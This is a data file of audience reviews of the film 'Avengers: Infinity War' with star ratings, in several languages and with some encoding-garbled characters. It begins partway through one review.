intrigue and manage not to be too sided and true to character. Likewise, the story is very eventful with a busy main story and several subplots. Yet it didn't feel sprawling and managed to make sense and never lose engagement. Basically it's a non-stop thrill-ride and tautly paced, with some reveals that leaves one gasping, twists that genuinely shock, rousing entrances and some of the finest action sequences of any Marvel film or any film recently, that are truly exciting and big in scale without being too noisy or exhausting. The climax is truly epic, in scale, spectacle, thrills and emotion. 'Avengers: Infinity War' hugely impresses in the script too, with snappy banter, hilarious quips (along with 'Thor: Ragnarok' this is one of the funniest Marvel films, Thor has the best of it), tension and an emotional poignancy not seen to this extent or as strongly in Marvel films. It's all intelligently handled and the humour didn't feel misplaced or inappropriate to me, this is a Marvel film that delivers on the spectacle and thrills while also having brains and heart. Marvel never disappoints when it comes to the production values. 'Avengers: Infinity War' is not an exception. It's beautifully and atmospherically designed, slickly filmed and edited and the special effects, not overused or abused, are some of the most extravagant and spectacular for any film seen recently. It's tightly directed and dynamically and rousingly scored. Overall, an excellent film and one of my standout viewings of all the films seen so far from the first half, and overall, of 2018. 9/10 Bethany Cox",4.5
"I'm waiting anxiously to a Marvel movie that will make me say ''Damn, this was better than Infinity War''",5
"This movie shows what patience and long build-ups can produce, which is the coalescence of all these characters you know and love battling it out against the biggest threat yet.",5
A cinematic masterpiece.,5
"Disney's Marvel's Avengers: Infinity War is about an infinite number of superheros fighting the halfway-existential threat of Thanos. The movie is even more bloated than the previous two Avengers films, but surprisingly holds together. Thanos is the most compelling villain yet. He does not see himself as the villain. He has a rational motivation for wiping out half the universe, and has the courage of his convictions. He shows humanity, despite being a giant, purple space monster. The ending, however, did not resonate as much as it should have. With half the MCU heroes being wiped out (though none of the ones who signed a four-film contract and leaving only about 70 Avengers for the next film), the audience should have been devastated. But since these films are so tonally light and cartoonish, the stakes don't feel all that high.",3.5
"Thanos is so epic, I love him.",5
"Brought the entire set of Marvel movies made over the past decade to a climax, especially with the cliffhanger ending, it reminded me of the ending to Star Wars ""Empire Strikes Back"" and left you waiting for Endgame.",5
"The MCU movie that made me really emotional! Action-packed, humorous, and very engaging! You won't wanna miss a thing!",5
JUST SEE IT!!IT IS AMAZING!!!!,5
"I really liked it! I don't care about all the bad review because this is a 2010s masterpiece. Like Heath Ledger as the Joker, Josh Brolin does an Oscar-worthy performance as Thanos! I can't believe I wasn't interested in the MCU back in 2018, but this movie blew my mind! It's a definite recommend for anyone looking for the next blockbuster superhero flick! And if the ending does not get you hyped for the sequel, then you need some serious help.",4.5
"Avengers: Infinity War tells the story of the combat of several heroes against an enemy, much bigger than them. The movie is, quite simply, a 21st century masterpiece, probably the best hero movie after its sequel. The biggest highlight is its script, which managed to bring together several characters and built a VERY intriguing story, and its visual and general direction, which is impeccable. Not only that, but the adventure and action are perfect, especially with the good acting. Another extremely positive point is that, even though the film is long, there is not a moment when you disconnect, as the jokes are balanced, the dialogues are not tiring and the story is captivating. The film is an explosion of emotions, especially for fans. Honestly, I dont see any major downsides in the film. Everything fits perfectly. Not only that, but its a movie that manages to stand on its own, although its always better to watch the previous movies for a better experience.",5
Fenominal! Amazing movie. Very touching.,5
"This film was so highly anticipated that it seems like the creators felt like failure was impossible, and so over hyped after-the-fact that nobody wants to point out the obvious flaws. Now, if I decided to delve into every issue I had with the film, we'd be here all day, so I'll focus on my biggest gripes. These two things are crucial to get right if you want to make a quality film, especially a superhero film and ESPECIALLY one this ambitious. You can't sacrifice the basics. The script, and the villain. The script was cringe worthy from the very beginning. You could tell the actors were doing their best with what they were given, but unfortunately their efforts couldn't salvage it. Many lines and scenes felt superfluous and doused in gravitas without any substance to speak of, leaving me wondering if I was missing something. It seems like it would be difficult to make your characters sound like they're being over dramatic when the stakes are half the lives in the universe, but somehow this script succeeds. However, my absolute biggest gripe of the film was the flimsy, unsympathetic, one-dimensional and frustratingly melodramatic villain, Thanos. Now, I know for a fact that Marvel knows how to write a quality villain. You've got sympathetic characters that, under certain circumstances, you may actually find yourself rooting for like Helmut Zemo, Eric Killmonger, Ava Starr and (more recently) Black Widow's adaptation of Taskmaster. There are charismatic, campy villains that sacrifice relatability for entertainment value like Hela, Mysterio and (more recently) Agatha Harkness. There are tragic villains that compellingly surrendered to the lemons life gave them like Loki and (more recently) Wenwu. Even most of Marvel's villains who are just straight-up psychopaths have a fleshed-out motivation, like a lust for power or money (Ulysses Klau), revenge (Aldrich Killian, Ivan Vanko), or zealotry (Ronan, Kaecilius) to support and strengthen their character Thanos has exactly none of those things. Maybe he'd be sympathetic if we knew more about him, but we don't. He's not charismatic, tragic or relatable. As a matter of fact, he has no clear motivation for his actions whatsoever, making the melodrama of his speech pattern unearned, incredibly grating and frankly hard to watch. I have no idea what gets him out of bed in the morning or what happened in his life to get him to this point. Maybe he's more fleshed out in the comic books, but if your movie has required reading in order to enjoy it, I'm sorry, you're doing something wrong. This conundrum is further emphasized by the fact that his end goal doesn't make sense, and there are about a million alternative solutions available to the wielder of the infinity gauntlet to the problem of overpopulation that don't include genociding half of all life, yet he seems stuck on it for absolutely no reason. A good superhero movie is made or broken by the quality of the villain, and the whiny, superficial antagonist here was incredibly immersion-breaking. I didn't believe him. To me, he felt like nothing more than an overpowered, psychopathic, petulant child. Overall, I have to say, I expected a lot more from Marvel. The plot felt rushed and the interactions of the characters that don't typically interact felt clunky, lazily written, and at times felt like entirely different characters than the ones I've come to love. I genuinely don't understand how so many people claim to love this film so much. It was, simply, terrible.",1
An incredible plot and character development. This is such a fantastic movie. The emotion is so real every time I watch Infinity War.,5
"I remember the day I went to the movie theater to watch this movie, ""it's gonna be bad, there's no way that they can tell a compelling story in less that two and a half hours, there's too many characters that have to be introduced to each other, there won't be enough screen time to do so and carry on with the story"", oh man, how wrong I was! This movie has Anthony and Joe Russo written all over the place, the writting is fantastic, the movie is well paced, and every character remains true to their own self which should have not been easy to pull off. This movie is a masterpiece.",5
A really cool movie. It began the finale of the Infinity Saga really well. Worth watching.,5
"This is the best Marvel movie I saw. I can watch it over and over again and I'll never get bored. Good plot and development, 5/5",5
Definitely a big improvement from the 2nd Avengers film. Incredible action in this movie. 4.5/5,4.5
"Thrilling, enthralling, funny, exciting, emotional and simply eye-opening.",5
The begining of the end.,5
Incredible work from the Russo Brothers as it was a very good movie.,5
Best Marvel movie to date. And second best superhero movie of all time right up there with TDK.,5
one of the best team up movie,5
"Who are we meant to root for in this movie? Two groups of heroes who go against their own character to enact brain-dead plans, or the super villain whose brilliant plan to save the universe is foiled by basic population growth? Of course all of this ridiculousness can be explained away by one character's vision of the future, a vision which seems impossible given the words of his mentor in his own origin story. It's an easy cheat, but ultimately unsatisfying.",2
"This movie is perfectly balanced as all things should be. Great action great story. Bringing the villains to life with back story,emotions, understandable goals without taking away the fear he brings(even if he goes about his goals in a genocidel way)",5
"This is by far the best Marvel movie ever made. Best sympathetic villain of all time in Thanos, amazing plot with the Infinity Stones, great pacing despite numerous characters/storylines. The only downside to seeing this is that every other superhero movie you watch will never measure up. TRUE RATING = 93/100",4.5
"Over a decade of characters hits the same wall at the same time, and that wall never falls. Infinity War is fantastic not just in execution but its many successes; its minor flaws only popping up particularly in the extent to which its primary antagonist ends up becoming not only the central character, but also seems to be given a little too sympathetic of a depiction despite being a literal genocidal monster.",4.5
"Nonstop action that doesn't feel forced. Despite its gargantuan cast, every character is given an important role and arc in some way or another. One of my favorite movies ever.",5
"Absolute must see. Humour, adventure, villain, storyline, CGI, action, everything is packed into this masterpiece.",5
"All character development, script, art, CGI, narrative, sounds, etc., is, literally, a masterpiece. Success is not for nothing.",5
So many characters and stories that needed to be tied together and somehow they did it perfectly. This movie has sky high stakes and a truly epic third act that will have you dying to know what happens next.,5
my rating says it all....Great movie,5
Melhor filme da vida q eu j√° vi,5
"Top 3 MCU movie of all time without a doubt. Finally we see Thanos and within the first 10 minutes we find out he‚Äôs everything we were told to be afraid of and has the best written character in the entire MCU he‚Äôs so captivating every time he‚Äôs on screen, Mr Cumberbatch Chris Hemsworth Robert Downey Jr really shine in this action packed ride cause this movie does not relax right from the get go you understand this is gonna be dark and might not end well for our favourite hero‚Äôs but the avengers never lose right‚Ä¶",5
Tbh this is the weakest of the avengers movies but still amazing.,4
"Mil veces mejor que Endgame, una pel√≠cula que si sabe introducir personajes y tambi√©n una lucha real con el villano",4
"Great movie, really entertaining, i like it",4
Really nice action-packed movie.,5
AHAA. THANOS BABAAA.,4
"This movie is one of the best movie of marvel ever made. All past movie was build for this movie and it works so well. Heroes should stop thanos to collect all stones, this will make us hooked till the last and movie is so well paced and its also brings out everything from the actors in the movie. The best thing was the action in the movie which was so well made and of high quality. Thor at the end was a major highlight.",5
"The best of the MCU by miles. The main character of this film is Thanos, and so we get to understand his psychology and by the end of the film, we understand without a doubt how far he is willing to go to complete his mission. Tony stark has a brilliant story where he once again risks his life to save the world. Watching him at the end as he realizes that they failed and loses Peter in his arms is a gut wrenching and poignant ending. Thor's brilliant character work started by Waititi in Ragnarok is carried on here along with the humour and he has my favourite scenes in the movie: his interactions with the Guardians, his quiet moment of reflection with Groot and Rocket, his entrance into Wakanda and his final confrontation with Thanos, all just brilliant. Captain America has the least to do of the big three, but his story is still good as the one to lead the defence on Earth alongside T'Challa in Wakanda, while trying to save Vision. My only issue with the movie is the visuals during the scenes on earth, which can be jarring.",5
"This my favourite marvel movie had everything sadness, anger, fear, a lot of action and had great scenes and you don't see much movies where the bad guy wins but this had it so it was different this movie is underrated it needs to given more credit.",5
Perfectly paced and accomplished anything that a two part film could set out to do. Not one dull or poor moment. Probably best MCU/superhero movie to date.,5
A fun movie with a great storyline,5
"Mercy is what Marvel has us at. I left the movie theater officially needing to bow down and praise the MCU for bringing everything and everyone together. We've been with these characters for 10+ years, they've grown on us, whether we liked them or not. Well thought out storyline all around. Everyone played their part without stepping on others toes. Craftily done. PERFECTION.",5
one of the best mcu and marvel movie,5
Great set up for upcoming closure.,4.5
the best marvel movie ever!!!,5
"With the story centering around Thanos, this movie flourishes. If you are a fan of the MCU, this film will put a smile on your face and leave you speechless at the end.",5
"√â importante pra ver o ultimato, se n√£o eu n√£o veria de novo.",3.5
Just pure perfection!,5
Miglior film per scene d'azione,5
"I think it's my most favorite MCU movie but Avengers Endgame was my least favorite Avengers movie (it seems very bloated and sluggish). This movie is very well done, but I only wish that Avengers at the end of the movie had a little longer fight with Thanos... I mean some characters were just tossed around like it was nothing.. I think it would have been better if more of the Avengers fought Thanos to the death before ending conclusion.",5
"The best movie of UCM, very impacting with the end, very asome.",5
"Avengers Infinity War is the culmination of 10 years of the Marvel Cinematic Universe, and it does not disappoint. With a wide range of characters, and multiple plotlines going on, this movie should be one of the hardest to keep track of, yet everything blends and flows almost seamlessly. There are of course hard cuts in the story that happen as it switches to different characters, but second after the cut the new scene already stations itself and get the viewer back on track. The entire movie is a rollercoaster of action, emotion, and witty humor that keeps it going as a movie that will be remembered as one of the best Marvel Cinematic Universe films. Avengers Infinity War is a requirement to watch before Avengers Endgame, and one I highly recommend going back and watching again anyway.",5
"From Thanos to the plot to the heart breaking ending, this movie is a must see gem!",5
Simply the greatest blockbuster of all time.,5
"Infinity War is extremely entertaining and rewatchable. The film does a good job of establishing Thanos while further developing existing characters. Once it starts, the story never slows down and makes for a fantastic watch.",5
"It's okay, but a little bit too boring.",3
This Movie is the best Marvel movie of all time.,5
"This film, whether we focus on its concept, its execution, its thematic consistency, its creativity in narrative subversion, or its ability to please a crowd, is one of the greatest feats of modern film, and is arguably the greatest film produced by Marvel studios to date.",5
Great film I wish it was longer,5
The best Avengers so far! You get a feeling that the characters actually have flaws and leaves the audience wanting more!,5
"Amazing loved it, I mean it's marvels avengers what else do I need to say‚Ä¶",4
unbelievable experience,5
"This movie felt like it went on for infinity... This really is another convoluted bloated CGI mess. A movie that shoves jokes in any crevice it can find and won't even take itself seriously because the writers know how laughably childish and braindead this film series is. I sat there in the theatre, my brain melting from the starburst cacophony of CGI battle effects that seemingly went on without any direction. It gets boring watching the same city destroyed, the same tired cliches, and a pot designed for people with the attention span of a goldfish. Yet in the end it was all for nothing. There was no solid conclusion to this idiotic yet convoluted plot, just a set up for the next cash-in sequel. Sit down and consume next entertainment experience.",0.5
Marvel really know how to make double money aren't they,5
One of the best films in the MCU.,5
An entertaining ensemble structured to show off each character in the universe just enough. Josh Brolin as Thanos was superb. It left me feeling exhilarated and cheated at the same time when I first watched it.,4.5
"Ha, some fans had to attend Therapy and Counselling after watching this movie. The ending was a rollercoaster of emotions. Good guys sometimes lose and bad guys sometimes win.",5
When I first saw this in theater I wanted to watch it again man I was blown away and couldn't wait to see what happens next in avengers endgame I love this movie. ‚ù§Ô∏è,5
Simplismente perfeito!,5
sin duda alguna de lo mejor de Marvel esta aca todo lo que un fans puede esperar de un cierre en su primera parte de una era dorada,5
What an emotional rollercoaster üò≠üò≠üò≠,5
"A great film as well as its history, is epic, yes, but it is not saved from failures, and it is that, in my opinion, the lowest point of this film, are the visual effects, and that is that they are Fatal! since they are not surprising at all, in fact, they are in excess and that causes it to not even look real anymore, practically the entire film is CGI and it seems as if it was unfinished, I think it could have been much better. It has a large number of characters, and I like that each one has their moment to shine, that's a plus point. The actions of each character are completely justified, Thanos as the main antagonist is perfect, the reasons for which he acts are given and he gives more richness to the film. Anyway, you can not stay without seeing Infinity War, it is a good movie but I think it was enough for more, that if, this does not prevent you from enjoying it at all.",3.5
this movie had me reeling. i cant wait for endgame!,5
Greatest Comic Book movie of All time ! Once in a lifetime experience.,5
By far one of the best marvel movies ever!,5
"Perhaps the most important film in the MCU to date, ""Avengers: Infinity War"" perfectly balances the large cast of heroes and blends them into this mix of action and humor packed quest to stop the mad titan, Thanos. The film has had such a big influence on our modern day because of how groundbreaking it ended up being. The CGI looked pretty awful at parts, though for the most part, it remained strong. At the end of the day, this was easily one of the best MCU films that has been released so far.",4.5
"I could sit here and type good things about this movie all day. The best Marvel Movie ever (Including its sequel) Josh Brolin's Thanos is the best cinematic villain ever, this includes the likes of Darth Vader. While you may think I have a Marvel bias, I actually prefer Star Wars, but must admit that Thanos is truly incredible.",5
Finalmente Marvel da un paso hac√≠a adelante en un universo compartido que se estaba quedando estancado,5
"A hard hitting, emotional film. I didn't want it to end. You could hear a pin drop in the cinema when Thanos snapped his fingers and people started to disappear. No doubt about it, the most action packed MCU film and it was awesome!",5
"This movie legit had me gasping out loud and whispering ""what the hell?"" in the space of 5 minutes. Edge of your seat super hero movie. All these characters that you think will have plot armor; this movie completely changed the game. Tom Hollands performance made me cry so hard and I hadn't even seen his first Spiderman movie yet. That kid is an incredibly gifted actor. Plus... bearded Captain America? Yes please.",5
Greatest comic book film ever!,5
outstanding action amazing characters and some hilarious lines this movie is a must watch.,5
Este filme sensacional. A hist√≥ria √© constru√≠da com muita habilidade. O roteiro convence e os efeitos especiais s√£o excelentes. Os diversos personagens s√£o bem distribu√≠dos na trama e as cenas de a√ß√£o s√£o muito bem executadas. Entretenimento de primeira grandeza.,5
"This is a must-see film, especially for the Marvel fans out there. If you've never seen an MCU movie it is time to get started folks. This movie has twists and turns you wouldn't come to expect from a Marvel film, and the ending is oh so sweet. The film has you on the edge of your seat, and its sequel feels like centuries away.",5
Another fantastic addition to the MCU. Delivers the MCU's most complex and threatening character in Thanos and an absolutely gut-punching ending. Everything in between is fantastic and Marvel delivered in this big-budget ambitious thriller!,5
Stupendo la battaglia √® una delle pi√π belle della storia del cinema,5
One of the absolute best Marvel movies by far.,5
My favorite Avengers movie ever. Better than End Game.,5
Foi incr√≠vel que vou guardar na minha cabe√ßa pelo resto da minha vida,4.5
Goosebumps right when I think of the movie. Such an epic conclusion - part 1. Keeps you so eagerly waiting for the End Game!,5
"Thanos! Nuff said. Well along with ""Not feeling so good"" as well as ""Ebambay!!!"" if that's how you spell it. Pacing, story, action, it is an instant classic and is a master class on Story management. Well Done!!!",5
"WOW, esta increible, tuvo un giro a la trama increible, de verdad, lo maximo",5
"N√£o faz sentido algu√©m do passado ser ,mais forte que os tr√™s juntos e sem as j√≥ias do infinito kk",0.5
"Often times its pacing is ahead of the story it‚Äôs trying to tell, but in spite of that, ‚ÄúInfinity War‚Äù is a satisfying team-up of many MCU characters that will leave fans wanting more.",3.5
More than magnificent. A masterpiece.,5
Perfection. Period. A+,5
"Really showcases some of the individual strengths of our heroes. Paints the picture of the mad titan Thanos, player brilliantly by Josh Brolin",5
Such a great movie even if you aren't a MCU fan.,5
"I've always loved this movie, and it's top 5 MCU material. This and Endgame fit so well together (even though I consider this quite a bit better than Endgame). I remember when nobody wanted this or Endgame spoiled. 10/10",5
"The first truly serious super-hero film, it reminded me more of Saving Private Ryan than anything else. The opening with Thanos stomping Thor and Hulk... heart stopping.",4.5
One of the greatest movies ever maid. Absolutely a masterpiece.,5
Best Superhero Crossover of all time,5
"Will leave your heart strings tugged, but is a master class in character development.",4.5
"Good action, good acting, awesome villian and some of the best special effects out there, top 5 comic movie",4.5
One of the greatest marvel movies ever made,5
"I'm going to compare Endgame to Infinity War. Endgame is a film with a ""tiring"" vibe as it deals with the end of the world after the events of Infinity War. Infinity War is more fluent, and it also has moments as epic as Endgame. The two films fit together perfectly, Marvel is fantastic. (9/10)",4.5
"La pel√≠cula del universo de Marvel que rompe con la f√≥rmula tradicional, es sin dudas la mejor de este universo, con un protagonista que es tan interesante que a pesar de ser el villano, es f√°cil ponerse de su lado, en conjunto con los grandes l√≠deres de este universo hacen una pel√≠cula que genuinamente te engancha e impacta desde el primer minuto",5

"75% of the critics love this movie, with 25% thinking its overstuffed and bloated and unsatisfying, I agree with the former. Though full of characters and story, this film is well fleshed out and well balanced and provides something Marvel films tend to lack, real consequences. My only beef in the film, which by correcting would have ranked it higher, was: 1) Why Star Lord felt it necessary to provoke Thanos, rather than help take the glove off, causing his predictable escape?",4.5
"Best movie I've ever seen, awesome crossover between all the characters, awesome action and an awesome ending I would have never expected",5
arguably the best marvel movie next to the Winter soldier,4
N√£o a como descrever esse filme! Sonhos de uma nerd em uma tela de cinema p1,5
"One of the greatest marvel movies by far a fitting beginning of the end. Infinity war greatly manages to balance lots of characters, its main villian and a good plot perfectly. Every character gets screen time and a chunk of the action providing some of the best character moments and action scenes in the MCU. Thanos is instantly a very intimidating villian making his presence known as he gets a suprisng but welcome amount of character development. Infinity war also has a lot of emotion running through it a big tear jerker for many fans indeed. A landmark in the comic book movie genre and the MCU infinity war ticks all the boxes a must watch.",5
"Amazing cliffhanger for the fans, I didn't expect it at all. 9/10",4.5
great movie. i loved it. when the pretty long movie ended I didnt want to leave the cinema. I was looking for the play button for the next chapter! one of the best ever,5
"Amazing gathering of all characters and one of the longest screentimes for a villain at the same time. Lack of character development is not an issue, as all the characters are already very well-developed. It is not a tremendous accomplishment for the MCU only but film history in general.",5
A great movie with everyone getting there time to shine and nail-biting moments makes this one of the best superhero movies ever made.,5
Probably one of the best films in the MCU. Pure emotion at the end though!,4.5
"Wow. On paper, this movie should be a total mess. But the brilliant Russo brothers pulled off a movie that perfectly balances the different sides of the MCU. Everything from the non-stop action to the emotional moments is an absolute treat for almost every MCU fan.",5
No hay ningun momento aburrido en esta pelicula y esta llena de marvel epico,5
#5/25 Best Moment: The ending and the action,4.5
DAMN BOIIIIIIIIIIIII.,5
"No doubt, this is the second best MCU film ever.",5

"I absolutely loved this film. It's indeed better than Endgame, despite its problems.",5
my favorite mcu movie,5
"88/100 one of the best, the only reason that he's not the first, it's bc endgame was like a masterpiece",4.5
"Definitely a good film, nice set up and follows all the years of Marvel stories.",3.5
"Phenomenal movie. The third act really shines everytime, on every rewatch, it all lead to this moment and they seriously delivered.",5
Purple Chinman's quest for jewelry might be the lamest and least interesting McGuffin ever put on film.,1
"In my opinion it's the best superhero movie ever made. It's agile, engaging, and charming. And it doesn't force you to be taken seriously. It manages to embrace the entire audience from child to adult.",5
"A very weak movie... full of plot holes. Its a disappointing conclusion to such a long line of great hits. Character development actually goes backwards, failling to pay true homage to great heroes such as Thor and Cap America",1
"Poor Hulk, he gets beat up by Thanos and suffers a mental collapse as nobody ever treated Hulk like this before! It was great to see a lot of Marvel characters in one movie, but they left out the Fantastic Four and Ultimate X-Men. Not faulting this movie but too much falls on the remaining members. In all honesty I cannot give this movie a 5 star rating so four stars will have to do!",4
"What. A. Movie. This movie SLAPPED! The action is phenomenal, the characters were great and the ending just makes you more invested in the MCU. It's better than endgame imo",5
"The best Marvel film to date. Amazing story, perfect pacing. This film is amazing.",5
It's easily in the top 3 favourite and best MCU movies ever made... LOVE IT LOVE IT LOVE IT,5
"A titan in the superhero genre, no cinematic universe will ever be able to do what this movie did, a 10 year and 18 movie build up, and it sure as hell delivered, somehow being able to juggle 4 different plot lines and make it work flawlessly and having one of the best character arcs in the genre in Thor. This wasn't just a movie, it was an event. One of the greatest comic book masterpieces and a true force of nature in cinema.",4.5
Really good film. I just wished Thanos didn't acquire all the stones. It made Endgame have to resort to the cheesy back in time exploit.,4.5
"The greatest installment in the Marvel Cinematic Universe. Despite moving numerous, distinct story arcs forward across vastly different places, the movies' pacing never lets up.",5
"A beautiful marvel film showing MCU at its best with its compelling and dark storyline, fantastic character connections and ability to connect so many different aspects into one film is what keeps you entirely engaged throughout the 150 minutes of the film. The depth to characters that are explored along with an amazing cast just proves to be compelling, engaging and splendid with emotional sequences and iconic moments that have you cheering, screaming and crying for your favourite team. One of the best villains ever that you can understand and feels more like the protagonist than the avengers do with Josh Brolin's incredible performance, this film will definitely having your internal and external voices screaming out aloud.",4.5
Amazing. Just intravenous movie pleasure. Exceeding all expectations for fans. This is what comicbook movies are supposed to be üëçüèª,5
"Avengers: Infinity War is the fourth big group movie of the MCU, but it takes the big group concept to a whole new level with it's massive cast of characters. Basically every big actor in the MCU (with the exception of a few) is in this movie, making it a true culmination movie and appropriately so as its release year of 2018 marks 10 years of the MCU. Considering how many actors are in this movie, it manages to not squander any of them and give many of them moments to shine and funny lines. The movie has some of the most hilarious one-liners of the whole MCU, and is sure to give viewers a lot of laughs along the way. The film also raises the stakes to the highest they've been in any Marvel movie ever, which grips people with anxiety and doubt the whole way through and never lets them go. The action hits and rises above the standard set by its two predecessors by giving us fight sequences with a much bigger scale than anything seen in the previous two Avengers movies. Thanos is a much better villain than Ultron was because while his execution of his goals isn't great, his goals themselves aren't necessarily bad, giving us a villain who is multidimensional and complex and actually dealing with real world problems. This calls into question the meaning behind the Avengers conflict with him and whether or not there were other methods by which the conflict could've been resolved or Thanos could've achieved his goals. But even more, Thanos is an incredibly powerful being and one who could actually achieve his goals despite having to face the Avengers, which differentiates him from other compelling MCU villains. He is a threat that the Avengers haven't had to deal with so far and are not fully prepared for. Thanos manages to achieve his goals at the end, making him only the second in the MCU to do so and remain alive, Zemo being the previous one. This makes Infinity War's end truly emotional for fans of the characters and the characters themselves and creates a huge cliffhanger for its sequel. While there are certainly things Infinity War could done a better job of addressing, the movie redeems the Avengers franchise from Age of Ultron and should leave viewers satisfied yet wanting more as the credits roll.",4.5
"The perfect Marvel Movie. This film does everything absolutely right, having emotion, comedy and action in all the right moments, without ruining the tone or the story (unlike Endgame)",5
"Connecting all points in the MCU until 2018 we have Infinity War, that is quite good although it is ""The Avengers vs. The Bad Guy"" Part 3. 9/10",4.5
Best Marvel movie for sure,5
"One of, if not the best MCU movie. This movie manages to bring together a huge cast of characters perfectly and seamlessly, while adding a lot to the lore of the MCU. Not to mention the amazing ending that shocked audiences all over the world.",5
The script was weak but spot on with the entire cast and all their charisma combined. The action and cgi was good. The best is the villain. I rewatched this in 2021. It wasnt as good as i suspected it to be. Will be rewatching End Game and i hope its a better script. The plus side though the movie didnt feel like 3 hours at all.,3
Some many fake reviews it's unbelievable! This movie is pure crap! Flush this thing outta existence!,0.5
"Amazing story, graphics and acting. And the BEST villain of marvel ever!",5
I watched this movie again thinking this is gonna be a fun time. And it fell flat of my expectations I think this movie was highly overrated and kept me out of the loop and Unentertained,2.5
Very well done film that changes it up with a sad ending where the villain wins and the protagonist(s) don't save the day in the end.,4
Very good it is funny has a great villain and probably the best ending of all time,5
Best marvel movie ever made!,5
"%50, BLƒ∞P............",3.5
One of my favorite movies of all time.,5
"This movie holds a frenetic pace from start to finish - it starts with a bang, then holds that bang until the final credits. I left the theatre feeling like I'd been punched in the guts - and a movie that has a impact that major is one you know they got right. I cant see a single flaw - its a perfect movie. Hopefully Marvel learn from this and this isn't the last time they make the villain the centre of one of their stories.",5
Amazing film! MCU did a fantastic job. Loved everything and the ending‚Ä¶I felt like something was ripped right out of my heart‚Ä¶.A++,5
"This was a shocking, sad and amazing experience. I couldn't suggest it more. Simply amazing.",5
Another avengers movie with the exact same plot as every other one :\,3
I am inevitable... I had the chills throughout so many fantastic moments!,5
i like this movie this movie is beat my heart,5
"Avengers Infinity War took a step that not many movies/franchises are willing to take, letting a villain actually succeed. Thanos is without a doubt, the best villain in any super hero/comic book movie in my opinion. Josh Brolin was masterful in this role. The cast of heroes was stacked and the directors did a fantastic time giving everyone their moment to shine while also giving us many memorable moments and team ups that we didnt see coming.",4.5
Sooooooooo many memes and the impact on you first viewing of the ending is the only thing thats keeping people remembering this movie otherwise it would just be lost,3
Great movie that balances a large cast of characters perfectly. A lot of bright and colorful scenes plus some great comedy and action.,4.5
"THE BEST THEATRE EXPERIENCE OF ALL TIME!! MCU at its peak. When this movie released, everybody was talking about it, there were many spoilers, since it was a very eventful movie, from the build-up starting from 2008. Endgame was also one of THE best theatre experience, but compared to Infinity War, the characters, plot and villains were better.",5
"Amazing movie, the best marvel movie 9.2/10.",4.5
"kids movie, yes it was bad, i cant imagine how people enjoying this kind of nonsense",0.5
Thanos kills it. Thats all. Incredible writting.,5
"How? Are the Russo's magicians? How did the balance the seventy-six characters it features. If this movie flopped, the whole buildup of 21 films would be a huge disappointment. The Russo's would be dragged in the dirt. But they did not crack. They had huge expectations for this film and they didn't disappoint. They established a great villain, great writing and interaction between beloved characters, high stakes, great cinematography, great acting, and amazing character development.",4
"Avengers Infinity War shocks the audience by killing half of all life and letting the villain win for the first time even though that could have been avoided if someone didn't punch him when not needed. The good: 1.Visuals(Wakanda,Space,Titan) 2.Thanos 3.Thor 4. Action Sequences The Not so Good: 1. Visuals on Earth 2. Vfx on Mark 5 3. Pacing 4. The ending's impact was ruined by the fact that more movies had already been announced 5. Captain America got left out",3
No enough story telling. Too much CGI. So many fight scene that it becomes boring.,2
"OMG!! The wait after what began with the first iron man, and building up every character in this universe to this gargantuan showdown, has ultimately paid off!",5
"here we have another work of art, these few movies show me that when Marvel wants to make perfect movies, its actors are well balanced, a perfect plot, in short, a perfect movie.",5
"A great movie, only issue was the villains should have been introduced before this instead of just being there. There was opportunity all over but nope.",4.5
"This movie is one of the if not the best marvel movie of all time. I want to talk about Thanos first. He has: A great motivation, an actually heart and personality (which we don't get a lot with Marvel villains), and we can tell he doesn't want to do what he does to get all 6 stones. I can't forget about the superheroes. Captain America is a great superhero, leader, and person. IronMan is funny but he's not comic relief, and that's the thing with this movie. There is a chance to mess up every character in this movie but the Russo brothers do such a great job with the characters that Infinity war doesn't even need good action. But the action is so creative and fantastic. I 110% recommend this movie for any kind of superhero fan.",5
"Great SFX, but the man in tight suits taking things way too serious is not for me. It's all just so predictable and frankly just not so interesting what they're doing. Marvel never captured me and this movie didn't change that.",2
Avengers: Infinity War is a perfect movie. Marvel did a good job bringing all these characters to the screen which worked perfectly. The action was fantastic. Thanos as the villain was so good. There wasn't a second that I didn't like about this movie. All in all I give this movie a 5/5 stars.,5
I didn‚Äôt really like this adaptation to the franchise,1.5
"It's so good, just watch it.",5
Avengers: Infinity War is one of the most significant achievement in modern blockbuster history. This movie dared to do the most risky decision for a marvel movie and it is something that will never be forgotten. This is the empire strikes back of the MCU. This movie is for comic book fans only!,5
"This movie is amazing, a true spectacle to see and it does exactly what it sets out to do.",5
I know it's not perfect.... But it's PERFECT for me. Better than ENDGAME,5
"For a 2 1/2 hour movie, things move at a break neck speed. The action is amazing, the story (though flawed) is great, and the acting is sensational. Marvel continues to deliver on its avengers movies. Though, I often wonder throughout this movie if they might have overstuffed.",5
The best superhero film since Nolan's dark knight Thanos is an epic villain and you really feel like you understand his mad plan through a brilliantly written plot. To sum up as superhero films go this as close to a masterpiece as it gets,5
"Disney and Marvel Studios were able to do what everyone thought was impossible, they were able to create a cinematic universe in which each hero would get their own movie to tell their own individual stories, and then bring them together in an epic movie event called The Avengers. In Avengers: Infinity War, Marvel Studios and the Russo Brothers took it to the next level by culminating 10 years' worth of movies and build-up to deliver not just one of the greatest superhero movies of all time but also one of the single greatest cinematic achievements ever done. Avengers: Infinity War is potentially the best movie out of the MCU in my personal opinion, it brings together all of your favorite heroes in one singular story crammed into a 2 1/2 hour epic and each hero gets their own moment to shine. It's something out of a comic book put onto the big screen that could only be done in our time. It's full of action, drama, and a score you'll be wanting to listen to long after you leave the theater and an ending that'll keep you thinking and talking about for days. This is a must-see!",5
"Muy buena, la mejor pel√≠cula de Superh√©roes que existe",5
"Possibly the best superhero movie ever made! Definitely the best Marvel movie ever made. Awesome characters and plot, great action/CGI scenes, funny moments, and a twisted ending. What's not to love?",5
"I believe many viewers have the perception while viewing Infinity War that Thanos is a complete despot, overcome with this insatiable need to control the population of the universe. This 'God complex' he's become obsessed with has driven him to these insane measures due taking extremist viewpoints on finite resources within all the planets across the galaxy. Any attempt to reason with him would obviously fall on deaf ears as he's also in this to wield the power that will allow him to execute the 'command' (snapping of his fingers with the gauntlet) that will reduce the universal population by 50%. No solitary person should have control of this type of power, yet it is a brilliant script for this movie and well executed with maximum tension until the very end of the film. The CGI work is very well done also,",5
Cool Movie definitely but not the biggest marvel fan,3
